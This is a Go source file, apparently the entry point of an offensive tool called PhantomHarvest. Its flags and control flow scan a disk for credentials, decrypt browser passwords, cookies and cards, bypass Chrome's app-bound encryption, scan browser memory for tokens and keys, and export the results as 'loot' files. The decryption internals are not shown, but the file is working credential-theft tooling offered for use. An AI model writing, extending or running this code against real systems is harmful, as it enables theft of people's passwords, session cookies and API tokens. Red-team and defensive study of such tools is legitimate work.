package main

import (
	"flag"
	"fmt"
	"os"
	"runtime"
	"strings"

	"github.com/phantom-offensive/PhantomHarvest/internal/decrypt"
	"github.com/phantom-offensive/PhantomHarvest/internal/harvest"
	"github.com/phantom-offensive/PhantomHarvest/internal/obfuscate"
)

var version = "1.0.0"

func main() {
	// Subprocess mode: crash-isolated Chrome v20 app-bound key extraction.
	// Spawned by the main process; prints hex key to stdout then exits.
	// Must be checked before flag.Parse() so a subprocess crash here
	// only kills the subprocess, not the parent scan.
	if len(os.Args) == 4 && os.Args[1] == decrypt.SubprocessModeFlag {
		decrypt.ExtractAndPrintAppBoundKey(os.Args[2], os.Args[3])
		return
	}

	defaultRoot := defaultRootDir()
	rootDir := flag.String("path", defaultRoot, "Root directory to scan")
	outputJSON := flag.Bool("json", false, "Output as JSON")
	outputCSV := flag.String("csv", "", "Export to CSV file (e.g. -csv loot.csv)")
	outputTXT := flag.String("txt", "", "Export to TXT file (e.g. -txt loot.txt)")
	outputHTML := flag.String("html", "", "Export to HTML report (e.g. -html report.html)")
	outputFile := flag.String("o", "", "Export to file (auto-detect: .json, .csv, .txt, .html)")
	quiet := flag.Bool("quiet", false, "Only show found credentials (no banner)")
	highOnly := flag.Bool("high-only", false, "Only show HIGH confidence findings")
	maxDepth := flag.Int("depth", 20, "Maximum directory depth")
	exclude := flag.String("exclude", "", "Comma-separated paths to exclude (e.g. TikTok,Discord)")
	decryptBrowsers := flag.Bool("decrypt-browsers", false, "Inline-decrypt browser passwords/cookies/cards (requires -tags decrypt build)")
	chromeV20 := flag.Bool("chrome-v20-experimental", false, "EXPERIMENTAL: attempt Chrome v127+ app-bound key bypass via IElevator COM (may crash on some Chrome builds)")

	// SharpChrome-equivalent flags
	browserFlag := flag.String("browser", "", "Only scan specific browser(s), comma-separated (e.g. chrome,firefox,edge,brave)")
	domainFlag := flag.String("domain", "", "Filter cookies by domain substring (e.g. google.com, .office.com)")
	loginsOnly := flag.Bool("logins-only", false, "Only extract saved browser passwords, skip everything else")
	cookiesOut := flag.String("cookies-out", "", "Export decrypted cookies in Netscape format (e.g. -cookies-out cookies.txt)")
	chromeKey := flag.String("chrome-key", "", "Pre-decrypted Chrome AES key as hex (remote DPAPI — use after offline masterkey decrypt)")
	dpapiMK := flag.String("dpapi-masterkey", "", "DPAPI masterkey as hex (from secretsdump/pypykatz) — auto-decrypts Chrome Local State blob")
	v20MemScan := flag.Bool("v20-memscan", false, "Scan chrome.exe process memory for v20 app-bound key (slow — browser must be running)")
	extractTokens := flag.Bool("extract-tokens", false, "Scan browser process memory for plaintext JWTs, bearer tokens, and API keys (browser must be running)")

	flag.Parse()

	if !*quiet {
		printBanner()
	}

	scanner := harvest.NewScanner(*rootDir, *maxDepth)
	if *exclude != "" {
		scanner.AddExcludes(strings.Split(*exclude, ","))
	}
	if *decryptBrowsers {
		if !decrypt.Enabled() {
			fmt.Fprintln(os.Stderr, "[!] Decryption support not compiled in. Rebuild with: make build-full")
		}
		scanner.DecryptBrowsers = true
	}
	if *chromeV20 {
		decrypt.EnableAppBoundV20()
		fmt.Fprintln(os.Stderr, "[!] Chrome v20 app-bound bypass ENABLED (experimental — may crash)")
	}
	if *v20MemScan {
		decrypt.EnableMemScan()
		fmt.Fprintln(os.Stderr, "[*] Chrome v20 memory scan ENABLED (browser must be running)")
	}
	if *extractTokens {
		scanner.ExtractTokens = true
		fmt.Fprintln(os.Stderr, "[*] Browser token extraction ENABLED (browser must be running)")
	}

	// SharpChrome-equivalent features
	if *browserFlag != "" {
		scanner.BrowserFilter = strings.Split(*browserFlag, ",")
	}
	if *domainFlag != "" {
		scanner.DomainFilter = *domainFlag
		scanner.DecryptBrowsers = true // domain filter only applies to decrypted cookies
		if !decrypt.Enabled() {
			fmt.Fprintln(os.Stderr, "[!] Decryption support not compiled in. Rebuild with: make build-full")
		}
	}
	if *loginsOnly {
		scanner.LoginsOnly = true
		scanner.DecryptBrowsers = true
		if !decrypt.Enabled() {
			fmt.Fprintln(os.Stderr, "[!] Decryption support not compiled in. Rebuild with: make build-full")
		}
	}
	if *chromeKey != "" {
		if err := decrypt.SetExternalChromiumKey(*chromeKey); err != nil {
			fmt.Fprintf(os.Stderr, "[!] -chrome-key: %v\n", err)
			os.Exit(1)
		}
		scanner.DecryptBrowsers = true
		fmt.Fprintf(os.Stderr, "[*] Remote DPAPI: using provided Chrome AES key\n")
	}
	if *dpapiMK != "" {
		if err := decrypt.SetDPAPIMasterKey(*dpapiMK); err != nil {
			fmt.Fprintf(os.Stderr, "[!] -dpapi-masterkey: %v\n", err)
			os.Exit(1)
		}
		scanner.DecryptBrowsers = true
		fmt.Fprintf(os.Stderr, "[*] Remote DPAPI: will derive Chrome key from Local State blob using provided masterkey\n")
	}

	results := scanner.Run()

	if *highOnly {
		var filtered []harvest.Finding
		for _, f := range results {
			if f.Confidence == harvest.ConfHigh {
				filtered = append(filtered, f)
			}
		}
		results = filtered
	}

	// Netscape cookie export
	if *cookiesOut != "" {
		harvest.OutputNetscape(results, *cookiesOut)
	}

	// Determine output file from -o flag (auto-detect format)
	if *outputFile != "" {
		lower := strings.ToLower(*outputFile)
		if strings.HasSuffix(lower, ".csv") {
			*outputCSV = *outputFile
		} else if strings.HasSuffix(lower, ".txt") {
			*outputTXT = *outputFile
		} else if strings.HasSuffix(lower, ".html") {
			harvest.OutputHTML(results, scanner.Meta, *outputFile)
			harvest.OutputTable(results)
			if len(results) == 0 {
				fmt.Fprintln(os.Stderr, "[*] Scan complete. 0 findings.")
			}
			return
		} else {
			harvest.OutputJSONFile(results, *outputFile)
			harvest.OutputTable(results)
			if len(results) == 0 {
				fmt.Fprintln(os.Stderr, "[*] Scan complete. 0 findings.")
			}
			return
		}
	}

	// Export to CSV
	if *outputCSV != "" {
		harvest.OutputCSV(results, *outputCSV)
	}

	// Export to TXT
	if *outputTXT != "" {
		harvest.OutputTXT(results, *outputTXT)
	}

	// Export to HTML
	if *outputHTML != "" {
		harvest.OutputHTML(results, scanner.Meta, *outputHTML)
	}

	// Terminal output
	if *outputJSON {
		harvest.OutputJSON(results)
	} else {
		harvest.OutputTable(results)
	}

	if len(results) == 0 {
		fmt.Fprintln(os.Stderr, "[*] Scan complete. 0 findings.")
	}
}

// defaultRootDir returns a sensible scan root for the current OS.
// On Windows, default to the Users directory (fast); everywhere else use /.
func defaultRootDir() string {
	if runtime.GOOS == "windows" {
		if home := os.Getenv("USERPROFILE"); home != "" {
			return home
		}
		return `C:\Users`
	}
	return "/"
}

func printBanner() {
	name := obfuscate.BannerName()
	sub := obfuscate.BannerSub()
	fmt.Print("\033[35m")
	fmt.Printf(`
    ╔═══════════════════════════════════════╗
    ║   %s — %s  ║
    ║   v%s                             ║
    ╚═══════════════════════════════════════╝`, name, sub, version)
	fmt.Print("\033[0m\n")
	fmt.Printf("  OS: %s/%s\n", runtime.GOOS, runtime.GOARCH)
	fmt.Println()
}
